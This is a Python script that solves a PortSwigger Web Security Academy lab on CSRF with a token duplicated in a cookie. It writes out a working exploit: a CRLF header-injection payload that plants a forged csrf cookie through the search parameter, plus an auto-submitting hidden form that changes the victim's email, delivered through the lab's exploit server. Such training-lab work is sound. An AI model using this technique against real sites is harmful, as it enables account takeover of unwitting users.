import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
import urllib


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
# author: 0xyf


class CSRF6:
    def __init__(self):
        self.lab_id = "0a7100bf04ac9198842c910200f90045"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def csrf(self):
        self.get_exploit_srv_url()
        http_header_injection_payload = urllib.parse.quote(
            "test\r\nSet-Cookie: csrf=0xyf; SameSite=None", safe=""
        )
        payload = f"""<form method="POST" action="{self.url}/my-account/change-email">
    <input type="hidden" name="email" value="0xyf@0xyf.local">
    <input type="hidden" name="csrf" value="0xyf">
    </form>
    <img src="{self.url}/?search={http_header_injection_payload}" onerror="document.forms[0].submit()">"""
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.csrf()
        self.check_solved()


def main():
    CSRF6().solve()


if __name__ == "__main__":
    main()
